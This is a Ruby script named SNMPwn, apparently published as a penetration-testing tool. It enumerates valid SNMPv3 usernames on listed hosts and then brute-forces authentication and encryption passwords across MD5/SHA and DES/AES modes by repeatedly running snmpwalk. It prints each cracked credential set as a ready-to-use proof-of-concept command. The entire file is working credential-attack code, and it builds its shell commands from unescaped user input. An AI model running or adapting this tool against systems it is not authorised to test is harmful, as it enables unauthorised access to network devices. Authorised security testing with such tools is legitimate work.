#!/usr/bin/env ruby
#SNMPwn
#SNMPv3 User Enumeration and Password Attack Script
#https://github.com/hatlord/snmpwn

require 'tty-command'
require 'tty-spinner'
require 'trollop'
require 'colorize'
require 'logger'
require 'text-table'

def arguments

  opts = Trollop::options do 
    version "snmpwn v0.97b".light_blue
    banner <<-EOS
    snmpwn v0.97b
      EOS

        opt :hosts, "SNMPv3 Server IP", :type => String
        opt :users, "List of users you want to try", :type => String
        opt :passlist, "Password list for attacks", :type => String
        opt :enclist, "Encryption Password List for AuthPriv types", :type => String
        opt :timeout, "Specify Timeout, for example 0.2 would be 200 milliseconds. Default 0.3", :default => 0.3
        opt :showfail, "Show failed password attacks"

        if ARGV.empty?
          puts "Need Help? Try ./snmpwn --help".red.bold
        exit
      end
    end
    Trollop::die :users, "You must specify a list of users to check for".red.bold if opts[:users].nil?
    Trollop::die :hosts, "You must specify a list of hosts to test".red.bold if opts[:hosts].nil?
    Trollop::die :passlist, "You must specify a password list for the attacks".red.bold if opts[:passlist].nil?
    Trollop::die :enclist, "You must specify an encryption password list for the attacks".red.bold if opts[:enclist].nil?
  opts
end

def livehosts(arg, hostfile, cmd)
  livehosts =[]
  spinner = TTY::Spinner.new("[:spinner] Checking Host Availability... ", format: :spin_2)

  puts "\nChecking that the hosts are live!".green.bold
  hostfile.each do |host|
    out, err = cmd.run!("snmpwalk #{host}")
    spinner.spin
      if err !~ /snmpwalk: Timeout/
        puts "#{host}: LIVE!".green.bold
        livehosts << host
      else
        puts "#{host}: Timeout/No Connection - Removing from host list".red.bold
      end
    end
  spinner.success('(Complete)')
  livehosts
end

def findusers(arg, live, cmd)
  users = []
  userfile = File.readlines(arg[:users]).map(&:chomp)
  spinner = TTY::Spinner.new("[:spinner] Checking Users... ", format: :spin_2)
  
  puts "\nEnumerating SNMPv3 users".light_blue.bold
  live.each do |host|
    userfile.each do |user|
      out, err = cmd.run!("snmpwalk -u #{user} #{host} iso.3.6.1.2.1.1.1.0")
        if !arg[:showfail]
          spinner.spin
        end
        if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:|SNMPv2-MIB::sysDescr.0 = STRING:/i
          puts "FOUND: '#{user}' on #{host}".green.bold
          users << [user, host]
        elsif err =~ /authorizationError/i
          puts "FOUND: '#{user}' on #{host}".green.bold
          users << [user, host]
        elsif err =~ /snmpwalk: Unknown user name/i
          if arg[:showfail]
          puts "FAILED: '#{user}' on #{host}".red.bold
        end
      end
    end
  end
    spinner.success('(Complete)')
    if !users.empty? and if !users.nil?
      puts "\nValid Users:".green.bold
      puts users.to_table(:header => ['User', 'Host'])
      users.each { |user| user.pop }.flatten!.uniq!
      users.sort!
    else
      puts "No users enumerated - Try a bigger list".red.bold
    end
  end
  users
end

def noauth(arg, users, live, cmd)
  results = []
  results << ["User", "Host"]
  encryption_pass = File.readlines(arg[:enclist]).map(&:chomp)
  spinner = TTY::Spinner.new("[:spinner] NULL Password Check...", format: :spin_2)

  puts "\nTesting SNMPv3 without authentication and encryption".light_blue.bold
  live.each do |host|
    users.each do |user|   
      out, err = cmd.run!("snmpwalk -u #{user} #{host} iso.3.6.1.2.1.1.1.0")
        if !arg[:showfail]
          spinner.spin
        end
        if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:|SNMPv2-MIB::sysDescr.0 = STRING:/i
          puts "'#{user}' can connect without a password to host #{host}".green.bold
          puts "POC ---> snmpwalk -u #{user} #{host}".light_magenta
          results << [user, host]
        else
          if arg[:showfail]
          puts "FAILED: Username:'#{user}' Host:#{host}".red.bold
        end
      end
    end
  end
  spinner.success('(Complete)')
  results
end

def authnopriv(arg, users, live, passwords, cmd)
  results = []
  results << ["User", "Host", "Password"]
  spinner = TTY::Spinner.new("[:spinner] Password Attack (No Crypto)...", format: :spin_2)

  puts "\nTesting SNMPv3 with authentication and without encryption".light_blue.bold
  live.each do |host|
    users.each do |user|
      passwords.each do |password|
        if password.length >= 8
          out, err = cmd.run!("snmpwalk -u #{user} -A #{password} #{host} -v3 iso.3.6.1.2.1.1.1.0 -l authnopriv")
            if !arg[:showfail]
              spinner.spin
            end
            if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:|SNMPv2-MIB::sysDescr.0 = STRING:/i
              puts "'#{user}' can connect with the password '#{password}'".green.bold
              puts "POC ---> snmpwalk -u #{user} -A #{password} #{host} -v3 -l authnopriv".light_magenta
              results << [user, host, password]
            else
              if arg[:showfail]
                puts "FAILED: Username:'#{user} Password:'#{password} Host: #{host}".red.bold
            end
          end
        end
      end
    end
  end
  spinner.success('(Complete)')
  results
end

def authpriv_md5des(arg, users, live, passwords, cmd, cryptopass)
  valid = []
  valid << ["User", "Password", "Encryption", "Host"]
  spinner = TTY::Spinner.new("[:spinner] Password Attack (MD5/DES)...", format: :spin_2)

  puts "\nTesting SNMPv3 with MD5 authentication and DES encryption".light_blue.bold
  live.each do |host|
    users.each do |user|
      passwords.each do |password|
        cryptopass.each do |epass|
          if epass.length >= 8 && password.length >= 8
            out, err = cmd.run!("snmpwalk -u #{user} -A #{password} -X #{epass} #{host} -v3 iso.3.6.1.2.1.1.1.0 -l authpriv", timeout: arg[:timeout])
              if !arg[:showfail]
                spinner.spin
              end
              if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:|SNMPv2-MIB::sysDescr.0 = STRING:/i
                puts "FOUND: Username:'#{user}' Password:'#{password}' Encryption password:'#{epass}' Host:#{host}, MD5/DES".green.bold
                puts "POC ---> snmpwalk -u #{user} -A #{password} -X #{epass} #{host} -v3 -l authpriv".light_magenta
                valid << [user, password, epass, host]
              else
                if arg[:showfail]
                puts "FAILED: Username:'#{user}' Password:'#{password}' Encryption password:'#{epass}' Host:#{host}".red.bold
              end
            end
          end
        end
      end
    end
  end
  spinner.success('(Complete)')
  valid
end

def authpriv_md5aes(arg, users, live, passwords, cmd, cryptopass)
  valid = []
  valid << ["User", "Password", "Encryption", "Host"]
  spinner = TTY::Spinner.new("[:spinner] Password Attack (MD5/AES)...", format: :spin_2)

  puts "\nTesting SNMPv3 with MD5 authentication and AES encryption".light_blue.bold
  live.each do |host|
    users.each do |user|
      passwords.each do |password|
        cryptopass.each do |epass|
          if epass.length >= 8 && password.length >= 8
            out, err = cmd.run!("snmpwalk -u #{user} -A #{password} -a MD5 -X #{epass} -x AES #{host} -v3 iso.3.6.1.2.1.1.1.0 -l authpriv", timeout: arg[:timeout])
              if !arg[:showfail]
                spinner.spin
              end
              if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:|SNMPv2-MIB::sysDescr.0 = STRING:/i
                puts "FOUND: Username:'#{user}' Password:'#{password}' Encryption password:'#{epass}' Host:#{host}, MD5/AES".green.bold
                puts "POC ---> snmpwalk -u #{user} -A #{password} -a MD5 -X #{epass} -x AES #{host} -v3 -l authpriv".light_magenta
                valid << [user, password, epass, host]
              else
                if arg[:showfail]
                puts "FAILED: Username:'#{user}' Password:'#{password}' Encryption password:'#{epass}' Host:#{host}".red.bold
              end
            end
          end
        end
      end
    end
  end
  spinner.success('(Complete)')
  valid
end

def authpriv_shades(arg, users, live, passwords, cmd, cryptopass)
  valid = []
  valid << ["User", "Password", "Encryption", "Host"]
  spinner = TTY::Spinner.new("[:spinner] Password Attack (SHA/DES)...", format: :spin_2)

  puts "\nTesting SNMPv3 with SHA authentication and DES encryption".light_blue.bold
  live.each do |host|
    users.each do |user|
      passwords.each do |password|
        cryptopass.each do |epass|
          if epass.length >= 8 && password.length >= 8
            out, err = cmd.run!("snmpwalk -u #{user} -A #{password} -a SHA -X #{epass} -x DES #{host} -v3 iso.3.6.1.2.1.1.1.0 -l authpriv", timeout: arg[:timeout])
              if !arg[:showfail]
                spinner.spin
              end
              if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:|SNMPv2-MIB::sysDescr.0 = STRING:/i
                puts "FOUND: Username:'#{user}' Password:'#{password}' Encryption password:'#{epass}' Host:#{host}, SHA/DES".green.bold
                puts "POC ---> snmpwalk -u #{user} -A #{password} -a SHA -X #{epass} -x DES #{host} -v3 -l authpriv".light_magenta
                valid << [user, password, epass, host]
              else
                if arg[:showfail]
                puts "FAILED: Username:'#{user}' Password:'#{password}' Encryption password:'#{epass}' Host:#{host}".red.bold
              end
            end
          end
        end
      end
    end
  end
  spinner.success('(Complete)')
  valid
end

def authpriv_shaaes(arg, users, live, passwords, cmd, cryptopass)
  valid = []
  valid << ["User", "Password", "Encryption", "Host"]
  spinner = TTY::Spinner.new("[:spinner] Password Attack (SHA/AES)...", format: :spin_2)

  puts "\nTesting SNMPv3 with SHA authentication and AES encryption".light_blue.bold
  live.each do |host|
    users.each do |user|
      passwords.each do |password|
        cryptopass.each do |epass|
          if epass.length >= 8 && password.length >= 8
            out, err = cmd.run!("snmpwalk -u #{user} -A #{password} -a SHA -X #{epass} -x AES #{host} -v3 iso.3.6.1.2.1.1.1.0 -l authpriv", timeout: arg[:timeout])
              if !arg[:showfail]
                spinner.spin
              end
              if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:|SNMPv2-MIB::sysDescr.0 = STRING:/i
                puts "FOUND: Username:'#{user}' Password:'#{password}' Encryption password:'#{epass}' Host:#{host}, SHA/AES".green.bold
                puts "POC ---> snmpwalk -u #{user} -A #{password} -a SHA -X #{epass} -x AES #{host} -v3 -l authpriv".light_magenta
                valid << [user, password, epass, host]
              else
                if arg[:showfail]
                puts "FAILED: Username:'#{user}' Password:'#{password}' Encryption password:'#{epass}' Host:#{host}".red.bold
              end
            end
          end
        end
      end
    end
  end
  spinner.success('(Complete)')
  valid
end

def print(users, no_auth, anp, ap, apaes, apsd, apsa)
  #need to get the user summary working to show IPs too
  puts "\nResults Summary:\n".green.bold
    puts "Valid Users Per System:".magenta
      puts users.to_table
  
  puts "\nAccounts that did not require a password to connect!".magenta
    puts "Example POC: snmpwalk -u username 10.10.10.1".light_magenta
      puts no_auth.to_table(:first_row_is_head => true)
  
  puts "\nAccount and password (No encryption configured - BAD)".magenta
    puts "Example POC: snmpwalk -u username -A password 10.10.10.1 -v3 -l authnopriv".light_magenta
      puts anp.to_table(:first_row_is_head => true)
  
  puts "\nAccount and password (MD5 Auth and DES Encryption - recommend SHA auth and AES for crypto!)".magenta
    puts "Example POC: snmpwalk -u username -A password -X password 10.10.10.1 -v3 -l authpriv".light_magenta
      puts ap.to_table(:first_row_is_head => true)
  
  puts "\nAccount and password (MD5 Auth and AES Encryption - Encryption OK, recommend SHA for auth!)".magenta
    puts "Example POC: snmpwalk -u username -A password -a MD5 -X password -x AES 10.10.10.1 -v3 -l authpriv".light_magenta
      puts apaes.to_table(:first_row_is_head => true)

  puts "\nAccount and password (SHA Auth and DES Encryption - Auth OK, recommend AES for crypto!)".magenta
    puts "Example POC: snmpwalk -u username -A password -a SHA -X password -x DES 10.10.10.1 -v3 -l authpriv".light_magenta
      puts apsd.to_table(:first_row_is_head => true)

  puts "\nAccount and password (SHA Auth and AES Encryption - Auth OK, Crypto OK!)".magenta
    puts "Example POC: snmpwalk -u username -A password -a SHA -X password -x AES 10.10.10.1 -v3 -l authpriv".light_magenta
      puts apsa.to_table(:first_row_is_head => true)
end


arg = arguments
hostfile = File.readlines(arg[:hosts]).map(&:chomp)
passwords = File.readlines(arg[:passlist]).map(&:chomp)
cryptopass = File.readlines(arg[:enclist]).map(&:chomp)
log = Logger.new('debug.log')
cmd = TTY::Command.new(output: log)
live = livehosts(arg, hostfile, cmd)
users = findusers(arg, live, cmd)
no_auth = noauth(arg, users, live, cmd)
anp = authnopriv(arg, users, live, passwords, cmd)
ap = authpriv_md5des(arg, users, live, passwords, cmd, cryptopass)
apaes = authpriv_md5aes(arg, users, live, passwords, cmd, cryptopass)
apsd = authpriv_shades(arg, users, live, passwords, cmd, cryptopass)
apsa = authpriv_shaaes(arg, users, live, passwords, cmd, cryptopass)
print(users, no_auth, anp, ap, apaes, apsd, apsa)